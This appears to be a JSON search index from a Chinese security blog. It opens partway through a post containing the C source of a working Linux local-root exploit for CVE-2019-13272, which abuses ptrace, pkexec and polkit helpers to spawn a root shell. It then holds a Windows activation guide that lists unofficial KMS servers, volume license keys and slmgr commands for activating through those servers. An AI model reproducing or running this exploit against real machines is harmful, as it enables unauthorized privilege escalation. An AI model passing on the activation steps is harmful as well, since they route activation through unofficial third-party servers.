%s\\n&quot;, &amp;buffer[0]); continue; &#125; /* check the path exists */ if (stat(&amp;buffer[0], &amp;st) != 0) continue; helpers[helper_index] = strndup(&amp;buffer[0], strlen(buffer)); helper_index++; if (helper_index &gt;= sizeof(helpers)/sizeof(helpers[0])) break; &#125; pclose(fp); return 0;&#125;// * * * * * * * * * * * * * * * * * Main * * * * * * * * * * * * * * * * *int ptrace_traceme_root() &#123; dprintf(&quot;[.] Using helper: %s\\n&quot;, helper_path); /* * set up a pipe such that the next write to it will block: packet mode, * limited to one packet */ SAFE(pipe2(block_pipe, O_CLOEXEC|O_DIRECT)); SAFE(fcntl(block_pipe[0], F_SETPIPE_SZ, 0x1000)); char dummy = 0; SAFE(write(block_pipe[1], &amp;dummy, 1)); /* spawn pkexec in a child, and continue here once our child is in execve() */ dprintf(&quot;[.] Spawning suid process (%s) ...\\n&quot;, pkexec_path); static char middle_stack[1024*1024]; pid_t midpid = SAFE(clone(middle_main, middle_stack+sizeof(middle_stack), CLONE_VM|CLONE_VFORK|SIGCHLD, NULL)); if (!middle_success) return 1; /* * wait for our child to go through both execve() calls (first pkexec, then * the executable permitted by polkit policy). */ while (1) &#123; int fd = open(tprintf(&quot;/proc/%d/comm&quot;, midpid), O_RDONLY); char buf[16]; int buflen = SAFE(read(fd, buf, sizeof(buf)-1)); buf[buflen] = &#x27;\\0&#x27;; *strchrnul(buf, &#x27;\\n&#x27;) = &#x27;\\0&#x27;; if (strncmp(buf, basename(helper_path), 15) == 0) break; usleep(100000); &#125; /* * our child should have gone through both the privileged execve() and the * following execve() here */ dprintf(&quot;[.] Tracing midpid ...\\n&quot;); SAFE(ptrace(PTRACE_ATTACH, midpid, 0, NULL)); SAFE(waitpid(midpid, &amp;dummy_status, 0)); dprintf(&quot;[~] Attached to midpid\\n&quot;); force_exec_and_wait(midpid, 0, &quot;stage2&quot;); exit(EXIT_SUCCESS);&#125;int main(int argc, char **argv) &#123; if (strcmp(argv[0], &quot;stage2&quot;) == 0) return middle_stage2(); if (strcmp(argv[0], &quot;stage3&quot;) == 0) return spawn_shell(); dprintf(&quot;Linux 4.10 &lt; 5.1.17 PTRACE_TRACEME local root (CVE-2019-13272)\\n&quot;); check_env(); if (argc &gt; 1 &amp;&amp; strcmp(argv[1], &quot;check&quot;) == 0) &#123; exit(0); &#125; /* Search for known helpers defined in &#x27;known_helpers&#x27; array */ dprintf(&quot;[.] Searching for known helpers ...\\n&quot;); for (int i=0; i&lt;sizeof(known_helpers)/sizeof(known_helpers[0]); i++) &#123; if (stat(known_helpers[i], &amp;st) == 0) &#123; helper_path = known_helpers[i]; dprintf(&quot;[~] Found known helper: %s\\n&quot;, helper_path); ptrace_traceme_root(); &#125; &#125; /* Search polkit policies for helper executables */ dprintf(&quot;[.] Searching for useful helpers ...\\n&quot;); find_helpers(); for (int i=0; i&lt;sizeof(helpers)/sizeof(helpers[0]); i++) &#123; if (helpers[i] == NULL) break; if (stat(helpers[i], &amp;st) == 0) &#123; helper_path = helpers[i]; ptrace_traceme_root(); &#125; &#125; return 0;&#125;","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"Linux提权","slug":"Linux提权","permalink":"http://example.com/tags/Linux%E6%8F%90%E6%9D%83/"}]},{"title":"windows激活教程","slug":"windows激活教程","date":"2019-10-07T12:46:14.000Z","updated":"2019-10-20T01:58:40.392Z","comments":true,"path":"2019/10/07/windows激活教程/","link":"","permalink":"http://example.com/2019/10/07/windows%E6%BF%80%E6%B4%BB%E6%95%99%E7%A8%8B/","excerpt":"","text":"Windows激活之前一直用软件激活，今天记录一下通过kms服务器激活windows系统的方式。 KMS服务器免费在大佬处搜刮了点kms服务器 123456789101112131415161718192021222324252627282930313233343536373839404142kms.03k.orgkms.chinancce.comkms.lotro.cccy2617.jios.orgkms.luody.infokms.cangshui.netzh.us.tokms.library.hkxykz.f3322.orgkms.binye.xyzkms.tttal.comkms.v0v.bidkms.moeclub.orgamrice.topkms.lolico.moekms8.MSGuides.comkms9.MSGuides.comkms.cz9.cnwindows.kms.appkms.zhuxiaole.orgkms.mogeko.mekms.ddz.redkey.17108.com222.184.9.98www.shuaiguoer.comact.liumengxiao.cnkms.51it.wangkms.iaini.netshinyashimokawa.spacekms.loacg.comkms.ijio.netkms.fingertc.comkms.magrco.netnb.shenqw.winkms.cin.inkkms.ymgblog.comkms.srv.crsoo.comkms.myds.cloudkms.magicwall.orgcosmiccat.netkms.ddddg.cnkms.izetn.cn 借鉴：https://blog.csdn.net/weixin_42588262/article/details/81120403 搭建kms服务器我选择一键搭建kms服务器 https://github.com/Mr-xn/kms-server-deploy KMS客户端安装密钥123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130Windows 10 专业版 - ProW269N-WFGWX-YVC9B-4J6C9-T83GX专业版N - Pro NMH37W-N47XK-V7XM9-C7227-GCQG9企业版 - EnterpriseNPPR9-FWDCX-D2C8J-H872K-2YT43企业版N - Enterprise NDPH2V-TTNVB-4X9Q3-TJR4H-KHJW4教育版 - EducationNW6C2-QMPVW-D7KKK-3GKT6-VCFB2教育版N - Education N2WH4N-8QGBV-H22JP-CT43Q-MDWWJ企业版2015LTSB - Enterprise 2015 LTSBWNMTR-4C88C-JK8YV-HQ7T2-76DF9企业版2015LTSB N - Enterprise 2015 LTSB N2F77B-TNFGY-69QQF-B8YKP-D69TJ企业版2016LTSB - Enterprise 2016 LTSBDCPHK-NFMTC-H88MJ-PFHPY-QJ4BJ企业版2016LTSB N - Enterprise 2016 LTSB NQFFDN-GRT3P-VKWWX-X7T3R-8B639&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Windows Server 2016数据中心版 - DatacenterCB7KF-BWN84-R7R2Y-793K2-8XDDG标准版 - StandardWC2BQ-8NRM3-FDDYY-2BFGV-KHKQY精华版 - EssentialsJCKRF-N37P4-C2D82-9YXRT-4M63B&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Windows 8.1专业版 - ProGCRJD-8NW9H-F2CDX-CCM8D-9D6T9专业版N - Pro NHMCNV-VVBFX-7HMBH-CTY9B-B4FXY企业版 - EnterpriseMHF9N-XY6XB-WVXMC-BTDCT-MKKG7企业版N - Enterprise NTT4HM-HN7YT-62K67-RGRQJ-JFFXW&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Windows Server 2012 R2标准版 - Server StandardD2N9P-3P6X9-2R39C-7RTCD-MDVJX数据中心版 - DatacenterW3GGN-FT8W3-Y4M27-J84CP-Q3VJ9精华版 - EssentialsKNC87-3J2TX-XB4WP-VCPJV-M4FWM&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Windows 8专业版 - ProNG4HW-VH26C-733KW-K6F98-J8CK4专业版N - Pro NXCVCF-2NXM9-723PB-MHCB7-2RYQQ企业版 - Enterprise32JNW-9KQ84-P47T8-D8GGY-CWCK7企业版N - Enterprise NJMNMF-RHW7P-DMY6X-RF3DR-X2BQT&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Windows Server 2012标准版 - Server StandardXC9B7-NBPP2-83J2H-RHMBY-92BT4数据中心版 - Datacenter48HP8-DN98B-MYWDG-T2DCC-8W83P&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Windows 7专业版 - ProFJ82H-XT6CR-J8D7P-XQJJ2-GPDD4专业版N - Pro NMRPKT-YTG23-K7D7T-X2JMM-QY7MG专业版E - Pro EW82YF-2Q76Y-63HXB-FGJG9-GF7QX企业版 - Enterprise33PXH-7Y6KF-2VJC9-XBBR8-HVTHH企业版N - Enterprise NYDRBP-3D83W-TY26F-D46B2-XCKRJ企业版E - Enterprise EC29WB-22CC8-VJ326-GHFJW-H9DH4&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Windows Server 2008 R2站点版 - Web6TPJF-RBVHG-WBW2R-86QPH-6RTM4标准版 - StandardYC6KT-GKW9T-YTKYR-T4X34-R7VHC企业版 - Enterprise489J6-VHDMP-X63PK-3K798-CPX3Y数据中心版 - Datacenter74YFP-3QFB3-KQT8W-PMXWJ-7M648 激活步骤查看系统版本例如，我这里是windows 7 企业版 或者使用命令查看 1wmic os get caption 安装产品密钥在上面的密钥中找到相应的激活密钥33PXH-7Y6KF-2VJC9-XBBR8-HVTHH 设置服务器在上面的kms服务器中随便找一个，执行 1slmgr &#x2F;skms kms kms.chinancce.com 激活系统激活 1slmgr &#x2F;ato 查看激活到期时间1slmgr &#x2F;xpr 查看授权信息1slmgr &#x2F;dlv 其他大佬的工具简单方便快捷 https://github.com/jm33-m0/kms-activate.git","categories":[{"name":"杂项","slug":"杂项","permalink":"http://example.com/categories/%E6%9D%82%E9%A1%B9/"}],"tags":[]}],"categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"Linux提权","slug":"Linux提权","permalink":"http://example.com/categories/Linux%E6%8F%90%E6%9D%83/"},{"name":"机器学习","slug":"机器学习","permalink":"http://example.com/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"sql注入练习","slug":"sql注入练习","permalink":"http://example.com/categories/sql%E6%B3%A8%E5%85%A5%E7%BB%83%E4%B9%A0/"},{"name":"无线安全","slug":"无线安全","permalink":"http://example.com/categories/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/"},{"name":"杂项","slug":"杂项","permalink":"http://example.com/categories/%E6%9D%82%E9%A1%B9/"}],"tags":[{"name":"内网渗透专栏","slug":"内网渗透专栏","permalink":"http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%93%E6%A0%8F/"},{"name":"工具","slug":"工具","permalink":"http://example.com/tags/%E5%B7%A5%E5%85%B7/"},{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"Weblogic","slug":"Weblogic","permalink":"http://example.com/tags/Weblogic/"},{"name":"信息收集","slug":"信息收集","permalink":"http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"name":"PHP反序列化","slug":"PHP反序列化","permalink":"http://example.com/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"php反序列化","slug":"php反序列化","permalink":"http://example.com/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"Harbor","slug":"Harbor","permalink":"http://example.com/tags/Harbor/"},{"name":"机器学习","slug":"机器学习","permalink":"http://example.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"靶机训练","slug":"靶机训练","permalink":"http://example.com/tags/%E9%9D%B6%E6%9C%BA%E8%AE%AD%E7%BB%83/"},{"name":"Solr 远程命令执行","slug":"Solr-远程命令执行","permalink":"http://example.com/tags/Solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"CVE-2019-0193","slug":"CVE-2019-0193","permalink":"http://example.com/tags/CVE-2019-0193/"},{"name":"sql注入","slug":"sql注入","permalink":"http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"joomla","slug":"joomla","permalink":"http://example.com/tags/joomla/"},{"name":"杂项","slug":"杂项","permalink":"http://example.com/tags/%E6%9D%82%E9%A1%B9/"},{"name":"74cms","slug":"74cms","permalink":"http://example.com/tags/74cms/"},{"name":"泛微OA","slug":"泛微OA","permalink":"http://example.com/tags/%E6%B3%9B%E5%BE%AEOA/"},{"name":"phpstudy后门","slug":"phpstudy后门","permalink":"http://example.com/tags/phpstudy%E5%90%8E%E9%97%A8/"},{"name":"Linux提权","slug":"Linux提权","permalink":"http://example.com/tags/Linux%E6%8F%90%E6%9D%83/"}]}